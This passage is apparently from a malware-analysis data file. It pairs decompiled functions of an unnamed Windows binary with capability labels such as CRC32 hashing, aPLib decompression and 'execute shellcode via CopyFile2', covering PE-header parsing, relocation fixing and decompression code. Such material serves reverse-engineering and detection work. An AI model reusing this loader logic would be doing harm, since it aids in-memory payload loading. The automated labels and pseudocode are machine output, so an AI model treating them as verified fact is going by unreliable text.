*(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00438ff3();\n                goto code_r0x00438fea;\n            }\n        }\n        puVar2 = fcn.0043008f();\n        *puVar2 = 0;\n        puVar2 = fcn.0043007c();\n        *puVar2 = 9;\n        fcn.00431906();\n    }\ncode_r0x00438fea:\n    fcn.00433b85();\n    return;\n}\n",
        "token_count": 607
    },
    "004395ac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004395ac(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.004326f1();\n    var_14h = 0;\n    if (*0x4640e8 == 0) {\n        iVar1 = (**0x44006c)(0x44b988);\n        pcVar6 = *0x440020;\n        if ((iVar1 == 0) || (iVar2 = (**0x440020)(iVar1, 0x44b97c),  pcVar4 = *0x4400a4,  iVar2 == 0))\n        goto code_r0x00439709;\n        *0x4640e8 = (**0x4400a4)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, 0x44b96c);\n        *0x4640ec = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x44b958);\n        *0x4640f0 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"Saturday\");\n        *0x4640f8 = (*pcVar4)(uVar3);\n        if (*0x4640f8 != 0) {\n            uVar3 = (*pcVar6)(iVar1, 0x44b924);\n            *0x4640f4 = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = *0x4400a8;\n    if ((*0x4640f4 == var_18h) || (*0x4640f8 == var_18h)) {\ncode_r0x004396b8:\n        if ((((*0x4640ec != var_18h) && (pcVar4 = (*pcVar6)(*0x4640ec),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x4640f0 != var_18h && (pcVar4 = (*pcVar6)(*0x4640f0),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (**0x4400a8)(*0x4640f4);\n        pcVar5 = (*pcVar6)(*0x4640f8);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x004396b8;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x4640e8);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x00439709:\n    fcn.0042a75a(unaff_EBX);\n    return;\n}\n",
        "token_count": 915
    },
    "0043aa2d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0043aa2d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    fcn.0042b761(arg_10h);\n    var_14h = fcn.0043c94f(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0043bead(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0043aa86:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0043aac6;\n        }\n        if (iVar1 != 2) {\ncode_r0x0043aab8:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0043aac6;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0043aab8;\n        goto code_r0x0043aa86;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0043aac6:\n    fcn.0042a75a(unaff_EBX);\n    return;\n}\n",
        "token_count": 507
    },
    "0043aad5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0043aad5(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    fcn.0042b761(arg_10h);\n    var_14h = fcn.0043c94f(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0043c3fe(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0043ab2e:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0043ab6e;\n        }\n        if (iVar1 != 2) {\ncode_r0x0043ab60:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0043ab6e;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0043ab60;\n        goto code_r0x0043ab2e;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0043ab6e:\n    fcn.0042a75a(unaff_EBX);\n    return;\n}\n",
        "token_count": 512
    },
    "00405230": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00405230(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int16_t *unaff_ESI;\n    \n    iVar2 = (*arg_8h)();\n    if (iVar2 == 0) {\n        return true;\n    }\n    if ((*unaff_ESI != 0x5a4d) || (*(unaff_ESI + 0x1e) == 0)) {\n        return 2;\n    }\n    iVar2 = (*arg_8h)(unaff_ESI + 0x20, *(unaff_ESI + 0x1e), 0xf8, arg_ch);\n    if (iVar2 == 0) {\n        return true;\n    }\n    if (((*(unaff_ESI + 0x20) == 0x4550) && (unaff_ESI[0x2c] == 0x10b)) && (unaff_ESI[0x23] != 0)) {\n        iVar2 = unaff_ESI[0x23] * 0x28;\n        *(unaff_ESI + 0xa0) = iVar2;\n        iVar3 = fcn.0042a769(iVar2);\n        *(unaff_ESI + 0x9c) = iVar3;\n        if (iVar3 == 0) {\n            return 3;\n        }\n        iVar1 = unaff_ESI[0x2a] + 0x18 + *(unaff_ESI + 0x1e);\n        *(unaff_ESI + 0x9e) = iVar1;\n        iVar2 = (*arg_8h)(iVar3, iVar1, iVar2, arg_ch);\n        return iVar2 == 0;\n    }\n    return 2;\n}\n",
        "token_count": 404
    },
    "00405470": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405470(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t uVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *(arg_8h + 0x74);\n    if (*(arg_8h + 0x144) == iVar2) {\n        return 0;\n    }\n    if ((*(arg_8h + 0xe0) != 0) && (*(arg_8h + 0xe4) != 0)) {\n        iVar3 = *(arg_8h + 0x144);\n        piVar6 = iVar3 + *(arg_8h + 0xe0);\n        piVar1 = *(arg_8h + 0xe4) + -8 + piVar6;\n        do {\n            if (piVar1 <= piVar6) {\n                return 0;\n            }\n            uVar8 = piVar6[1] - 8U >> 1;\n            piVar9 = piVar6 + 2;\n            uVar7 = 0;\n            if (uVar8 != 0) {\n                do {\n                    uVar4 = *piVar9 >> 0xc;\n                    if (uVar4 != 0) {\n                        if (uVar4 != 3) {\n                            return 5;\n                        }\n                        piVar5 = (*piVar9 & 0xfff) + *piVar6 + *(arg_8h + 0x144);\n                        *piVar5 = *piVar5 + (iVar3 - iVar2);\n                    }\n                    uVar7 = uVar7 + 1;\n                    piVar9 = piVar9 + 2;\n                } while (uVar7 < uVar8);\n            }\n            piVar6 = piVar6 + piVar6[1];\n        } while( true );\n    }\n    return 4;\n}\n",
        "token_count": 477
    },
    "00405ba0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_3\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __thiscall fcn.00405ba0(uint *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint *arg_8h;\n    uint *arg_ch;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_4h;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack60;\n    char *apcStack44 [3];\n    uint32_t var_28h;\n    uint uStack28;\n    uint *puStack24;\n    uint32_t *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h_2;\n    uint var_ch_3;\n    \n    var_14h = 0x43d6d0;\n    var_18h = *in_FS_OFFSET;\n    uStack60 = *0x4506f0 ^ &var_ch_3;\n    var_1ch = &uStack60;\n    *in_FS_OFFSET = &var_18h;\n    uVar4 = var_4h | 0xf;\n    uVar5 = var_4h;\n    if (uVar4 != 0xffffffff) {\n        uVar1 = param_1[5];\n        uVar3 = uVar1 >> 1;\n        uVar5 = uVar4;\n        if ((uVar4 / 3 < uVar3) && (uVar5 = uVar3 + uVar1,  -uVar3 - 2 < uVar1)) {\n            uVar5 = 0xfffffffe;\n        }\n    }\n    arg_8h = NULL;\n    var_10h_2 = 0;\n    puStack24 = param_1;\n    puVar2 = &uStack60;\n    if ((uVar5 + 1 != 0) && (arg_8h = fcn.0042b2b1(uVar5 + 1),  puVar2 = var_1ch,  arg_8h == NULL)) {\n        uStack28 = 0;\n        fcn.0042ac29(&uStack28);\n        apcStack44[0] = \"WSHS4954XGCLRNSRX\";\n        fcn.0042b331(apcStack44, 0x44c6c0);\n        var_28h = var_4h;\n        var_10h_2 = CONCAT31(var_10h_2._1_3_, 2);\n        var_1ch = &stack0xffffffb8;\n        fcn.00405b50(var_4h + 1);\n        return 0x405076;\n    }\n    var_1ch = puVar2;\n    if (param_3 != 0) {\n        arg_ch = param_1;\n        if (0xf < param_1[5]) {\n            arg_ch = *param_1;\n        }\n        fcn.0042a840(arg_8h, arg_ch, param_3);\n    }\n    if (0xf < param_1[5]) {\n        fcn.0042a679();\n    }\n    *param_1 = 0;\n    *param_1 = arg_8h;\n    param_1[5] = uVar5;\n    param_1[4] = param_3;\n    if (0xf < uVar5) {\n        param_1 = arg_8h;\n    }\n    *(param_1 + param_3) = 0;\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 863
    },
    "00406880": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_114h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00406880(uint32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t **arg_1ch, \n            uint32_t *arg_20h, int32_t arg_24h, uint32_t *arg_28h, uint32_t *arg_2ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint var_114h;\n    uint32_t **var_d8h;\n    uint32_t **var_d4h;\n    int32_t var_d0h;\n    uint32_t var_cch;\n    int32_t var_c8h;\n    uint32_t *var_c4h;\n    uint32_t *var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    uint32_t var_b4h;\n    uint32_t var_b0h;\n    uint32_t var_ach;\n    uint32_t *var_a8h;\n    uint32_t var_a4h;\n    uint32_t var_a0h;\n    uint32_t var_9ch;\n    uint32_t *var_98h;\n    int32_t var_94h;\n    uint32_t *var_90h;\n    uint32_t var_8ch;\n    uint32_t var_88h;\n    uint var_84h;\n    uint var_80h;\n    int32_t aiStack128 [14];\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    var_c8h = arg_24h;\n    var_c0h = arg_2ch;\n    var_98h = arg_8h;\n    var_b0h = arg_ch;\n    var_d4h = arg_1ch;\n    var_c4h = arg_28h;\n    var_44h = 0;\n    var_40h = 0;\n    var_3ch = 0;\n    var_38h = 0;\n    var_34h = 0;\n    var_30h = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    var_24h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    var_8h = 0;\n    uVar6 = arg_ch;\n    do {\n        (&var_44h)[*arg_8h] = (&var_44h)[*arg_8h] + 1;\n        arg_8h = arg_8h + 1;\n        uVar6 = uVar6 - 1;\n    } while (uVar6 != 0);\n    if (var_44h == arg_ch) {\n        *arg_1ch = NULL;\n        *arg_20h = 0;\n        fcn.0042a75a(var_114h);\n        return;\n    }\n    var_88h = *arg_20h;\n    var_8ch = 1;\n    do {\n        if ((&var_44h)[var_8ch] != 0) break;\n        var_8ch = var_8ch + 1;\n    } while (var_8ch < 0x10);\n    if (var_88h < var_8ch) {\n        var_88h = var_8ch;\n    }\n    var_a4h = 0xf;\n    do {\n        if ((&var_44h)[var_a4h] != 0) break;\n        var_a4h = var_a4h - 1;\n    } while (var_a4h != 0);\n    if (var_a4h < var_88h) {\n        var_88h = var_a4h;\n    }\n    iVar8 = 1 << (var_8ch & 0x1f);\n    *arg_20h = var_88h;\n    for (uVar6 = var_8ch; uVar6 < var_a4h; uVar6 = uVar6 + 1) {\n        if (iVar8 - (&var_44h)[uVar6] < 0) goto code_r0x00406a99;\n        iVar8 = (iVar8 - (&var_44h)[uVar6]) * 2;\n    }\n    var_a0h = var_a4h * 4;\n    iVar7 = (&var_44h)[var_a4h];\n    var_d0h = iVar8 - iVar7;\n    if (-1 < var_d0h) {\n        (&var_44h)[var_a4h] = iVar7 + var_d0h;\n        iVar8 = 0;\n        iVar7 = var_a4h - 1;\n        var_80h = 0;\n        if (iVar7 != 0) {\n            iVar9 = 0;\n            do {\n                iVar8 = iVar8 + *(&var_40h + iVar9);\n                iVar7 = iVar7 + -1;\n                *(aiStack128 + iVar9) = iVar8;\n                iVar9 = iVar9 + 4;\n            } while (iVar7 != 0);\n        }\n        uVar6 = 0;\n        do {\n            uVar3 = *var_98h;\n            var_98h = var_98h + 1;\n            var_90h = var_98h;\n            if (uVar3 != 0) {\n                iVar8 = (&var_84h)[uVar3];\n                arg_2ch[iVar8] = uVar6;\n                (&var_84h)[uVar3] = iVar8 + 1;\n            }\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < arg_ch);\n        var_b0h = (&var_84h)[var_a4h];\n        var_90h = arg_2ch;\n        uVar6 = 0;\n        iVar8 = -var_88h;\n        var_ach = 0;\n        var_84h = 0;\n        var_94h = -1;\n        var_114h = 0;\n        var_98h = NULL;\n        var_a0h = 0;\n        if (var_8ch <= var_a4h) {\n            var_a8h = &var_44h + var_8ch;\n            uVar3 = var_88h;\n            do {\n                uVar2 = *var_a8h;\n                while (uVar2 != 0) {\n                    var_9ch = uVar2 - 1;\n                    if (iVar8 + uVar3 < var_8ch) {\n                        var_bch = iVar8 - uVar3;\n                        var_cch = uVar2;\n                        iVar7 = iVar8 + uVar3;\n                        do {\n                            iVar8 = iVar7;\n                            var_bch = var_bch + uVar3;\n                            var_94h = var_94h + 1;\n                            uVar6 = var_a4h - iVar8;\n                            if (var_88h < var_a4h - iVar8) {\n                                uVar6 = var_88h;\n                            }\n                            uVar3 = var_8ch - iVar8;\n                            uVar2 = 1 << (uVar3 & 0x1f);\n                            if ((var_cch < uVar2) && (iVar7 = uVar2 + (-1 - var_9ch),  puVar4 = var_a8h,  uVar3 < uVar6)\n                               ) {\n                                while (uVar3 = uVar3 + 1,  uVar3 < uVar6) {\n                                    var_98h = puVar4 + 1;\n                                    if (iVar7 * 2 <= *var_98h) break;\n                                    iVar7 = iVar7 * 2 - *var_98h;\n                                    puVar4 = var_98h;\n                                }\n                            }\n                            var_a0h = 1 << (uVar3 & 0x1f);\n                            uVar6 = var_a0h + *var_c4h;\n                            if (0x5a0 < uVar6) goto code_r0x00406a99;\n                            var_98h = var_c8h + *var_c4h * 8;\n                            var_d8h = &var_114h + var_94h;\n                            (&var_114h)[var_94h] = var_98h;\n                            *var_c4h = uVar6;\n                            if (var_94h == 0) {\n                                *var_d4h = var_98h;\n                            }\n                            else {\n                                (&var_84h)[var_94h] = var_ach;\n                                uVar6 = var_ach >> (var_bch & 0x1f);\n                                puVar4 = var_d8h[-1];\n                                var_b8h = var_b8h & 0xffff0000 | CONCAT11(var_88h, uVar3);\n                                var_b4h = (var_98h - puVar4 >> 3) - uVar6;\n                                puVar4[uVar6 * 2] = var_b8h;\n                                puVar4[uVar6 * 2 + 1] = var_b4h;\n                            }\n                            iVar7 = iVar8 + var_88h;\n                            uVar3 = var_88h;\n                            uVar6 = var_ach;\n                        } while (iVar8 + var_88h < var_8ch);\n                    }\n                    cVar1 = var_8ch;\n                    uVar5 = iVar8;\n                    if (var_90h < var_c0h + var_b0h) {\n                        var_b4h = *var_90h;\n                        if (var_b4h < arg_10h) {\n                            var_b8h._0_1_ = (-(var_b4h < 0x100) & 0xa0U) + 0x60;\n                        }\n                        else {\n                            iVar7 = (var_b4h - arg_10h) * 4;\n                            var_b8h._0_1_ = *(iVar7 + arg_18h) + 'P';\n                            var_b4h = *(iVar7 + arg_14h);\n                        }\n                        var_90h = var_90h + 1;\n                    }\n                    else {\n                        var_b8h._0_1_ = -0x40;\n                    }\n                    var_b8h = CONCAT31(CONCAT21(var_b8h._2_2_, cVar1 - uVar5), var_b8h);\n                    iVar7 = 1 << (cVar1 - uVar5 & 0x1f);\n                    uVar3 = uVar6 >> (uVar5 & 0x1f);\n                    if (uVar3 < var_a0h) {\n                        puVar4 = var_98h + uVar3 * 2;\n                        do {\n                            *puVar4 = var_b8h;\n                            puVar4[1] = var_b4h;\n                            uVar3 = uVar3 + iVar7;\n                            puVar4 = puVar4 + iVar7 * 2;\n                            uVar6 = var_ach;\n                        } while (uVar3 < var_a0h);\n                    }\n                    uVar2 = 1 << (cVar1 - 1U & 0x1f);\n                    uVar3 = uVar6 & uVar2;\n                    while (uVar3 != 0) {\n                        uVar6 = uVar6 ^ uVar2;\n                        uVar2 = uVar2 >> 1;\n                        uVar3 = uVar6 & uVar2;\n                    }\n                    uVar6 = uVar6 ^ uVar2;\n                    var_ach = uVar6;\n                    uVar2 = var_9ch;\n                    uVar3 = var_88h;\n                    if (((1 << (uVar5 & 0x1f)) - 1U & uVar6) != (&var_84h)[var_94h]) {\n                        do {\n                            iVar8 = iVar8 - var_88h;\n                            var_94h = var_94h + -1;\n                        } while (((1 << (iVar8 & 0x1f)) - 1U & uVar6) != (&var_84h)[var_94h]);\n                    }\n                }\n                var_a8h = var_a8h + 1;\n                var_8ch = var_8ch + 1;\n                var_9ch = uVar2;\n            } while (var_8ch <= var_a4h);\n        }\n        fcn.0042a75a(var_114h);\n        return;\n    }\ncode_r0x00406a99:\n    fcn.0042a75a(var_114h);\n    return;\n}\n",
        "token_count": 3037
    },
    "004126e0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_3\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __thiscall fcn.004126e0(uint *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint *arg_8h;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_4h;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack56;\n    char *apcStack40 [3];\n    uint var_24h;\n    uint *puStack24;\n    uint32_t *puStack20;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h_2;\n    uint var_ch_3;\n    \n    var_14h = 0x43dfb0;\n    var_18h = *in_FS_OFFSET;\n    uStack56 = *0x4506f0 ^ &var_ch_3;\n    puStack20 = &uStack56;\n    *in_FS_OFFSET = &var_18h;\n    uVar5 = var_4h | 7;\n    uVar6 = var_4h;\n    if (uVar5 < 0x7fffffff) {\n        uVar1 = param_1[5];\n        uVar4 = uVar1 >> 1;\n        uVar6 = uVar5;\n        if ((uVar5 / 3 < uVar4) && (uVar6 = uVar4 + uVar1,  0x7ffffffe - uVar4 < uVar1)) {\n            uVar6 = 0x7ffffffe;\n        }\n    }\n    arg_8h = NULL;\n    uVar5 = uVar6 + 1;\n    var_10h_2 = 0;\n    puStack24 = param_1;\n    puVar2 = &uStack56;\n    if ((uVar5 != 0) &&\n       ((puVar2 = &uStack56,  0x7fffffff < uVar5 ||\n        (arg_8h = fcn.0042b2b1(uVar5 * 2),  puVar2 = puStack20,  arg_8h == NULL)))) {\n        puStack20 = puVar2;\n        var_24h = 0;\n        fcn.0042ac29(&var_24h);\n        apcStack40[0] = \"WSHS4954XGCLRNSRX\";\n        fcn.0042b331(apcStack40, 0x44c6c0);\n        var_10h_2 = CONCAT31(var_10h_2._1_3_, 2);\n        puStack20 = &stack0xffffffbc;\n        fcn.004125f0(var_4h + 1);\n        return 0x411bbd;\n    }\n    puStack20 = puVar2;\n    puVar3 = arg_8h;\n    if (param_3 != 0) {\n        puVar3 = param_1;\n        if (7 < param_1[5]) {\n            puVar3 = *param_1;\n        }\n        puVar3 = fcn.0042a840(arg_8h, puVar3, param_3 * 2);\n    }\n    if (7 < param_1[5]) {\n        puVar3 = fcn.0042a679();\n    }\n    *param_1 = arg_8h;\n    param_1[5] = uVar6;\n    param_1[4] = param_3;\n    if (7 < uVar6) {\n        param_1 = arg_8h;\n    }\n    *(param_1 + param_3 * 2) = 0;\n    *in_FS_OFFSET = var_18h;\n    return puVar3;\n}\n",
        "token_count": 902
    },
    "0041d960": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d960(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *in_ECX;\n    int32_t *extraout_ECX;\n    uint32_t uVar3;\n    \n    iVar1 = *in_ECX;\n    uVar3 = (in_ECX[1] - iVar1) / 0x1c;\n    if (0x9249249U - arg_8h < uVar3) {\n        arg_8h = fcn.00429b7e(0x4452d8);\n        in_ECX = extraout_ECX;\n    }\n    uVar3 = uVar3 + arg_8h;\n    uVar2 = (in_ECX[2] - iVar1) / 0x1c;\n    if (uVar2 < uVar3) {\n        if (0x9249249 - (uVar2 >> 1) < uVar2) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = uVar2 + (uVar2 >> 1);\n        }\n        if (uVar2 < uVar3) {\n            uVar2 = uVar3;\n        }\n        fcn.0041d840(uVar2);\n    }\n    return;\n}\n",
        "token_count": 294
    },
    "00423860": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuchar * __cdecl\nfcn.00423860(uchar *arg_8h, uint *arg_ch, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint32_t arg_20h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43f0b8;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 0;\n    puVar2 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar2 = &arg_ch;\n    }\n    uVar1 = fcn.0042ad20(puVar2, uVar1);\n    if (uVar1 % 3 != 0) {\n        uVar1 = (uVar1 - uVar1 % 3) + 3;\n    }\n    arg_8h_00 = fcn.0042a769((uVar1 * 8) / 6 + 1);\n    puVar2 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar2 = &arg_ch;\n    }\n    uVar3 = arg_8h_00;\n    arg_ch_00 = fcn.0042ad20(puVar2);\n    fcn.00420740(puVar2, arg_ch_00, uVar3);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    uVar3 = fcn.0042ad20(arg_8h_00);\n    fcn.004062a0(arg_8h_00, uVar3);\n    if (0xf < arg_20h) {\n        fcn.0042a679(arg_ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 520
    },
    "00425bd0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00425bd0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    int32_t *piVar6;\n    uint16_t *puVar7;\n    int32_t iVar8;\n    uint var_4h;\n    \n    iVar4 = arg_8h;\n    *(arg_8h + 0x1f2c + *(arg_8h + 0x1af2c)) = arg_10h;\n    *(arg_8h + 0x1af2c) = *(arg_8h + 0x1af2c) + 1;\n    if (arg_ch == 0) {\n        piVar3 = arg_8h + 0x14 + arg_10h * 4;\n        *piVar3 = *piVar3 + 1;\n    }\n    else {\n        piVar3 = arg_8h + 0x418 + *(arg_8h + 0x1b3d + arg_10h) * 4;\n        *piVar3 = *piVar3 + 1;\n        arg_ch = arg_ch + -1;\n        if (arg_ch < 0x100) {\n            uVar5 = *(arg_8h + 0x1c3d + arg_ch);\n        }\n        else {\n            uVar5 = *((arg_ch >> 7) + 0x1d3d + arg_8h);\n        }\n        piVar3 = arg_8h + 0x908 + uVar5 * 4;\n        *piVar3 = *piVar3 + 1;\n        *(arg_8h + 0x9f2c + *(arg_8h + 0x1af30) * 2) = arg_ch;\n        *(arg_8h + 0x1af30) = *(arg_8h + 0x1af30) + 1;\n        *(arg_8h + 0x1af38) = *(arg_8h + 0x1af38) | *(arg_8h + 0x1af39);\n    }\n    *(arg_8h + 0x1af39) = *(arg_8h + 0x1af39) << 1;\n    if ((*(arg_8h + 0x1af2c) & 7) == 0) {\n        *(*(arg_8h + 0x1af34) + 0x19f2c + arg_8h) = *(arg_8h + 0x1af38);\n        *(arg_8h + 0x1af34) = *(arg_8h + 0x1af34) + 1;\n        *(arg_8h + 0x1af38) = 0x100;\n    }\n    if ((2 < *(arg_8h + 4)) && ((*(arg_8h + 0x1af2c) & 0xfff) == 0)) {\n        iVar8 = *(arg_8h + 0x1af2c) * 8;\n        piVar1 = arg_8h + 0x6af84;\n        piVar2 = arg_8h + 0x6af74;\n        arg_10h = 0;\n        arg_8h = 0;\n        piVar6 = 0x44813c;\n        puVar7 = iVar4 + 0x90c;\n        do {\n            iVar8 = iVar8 + puVar7[-2] * (piVar6[-1] + 5);\n            arg_8h = arg_8h + (*piVar6 + 5) * *puVar7;\n            arg_10h = arg_10h + puVar7[2] * (piVar6[1] + 5);\n            piVar6 = piVar6 + 3;\n            puVar7 = puVar7 + 6;\n        } while (piVar6 < 0x4481b4);\n        if ((*(iVar4 + 0x1af30) < 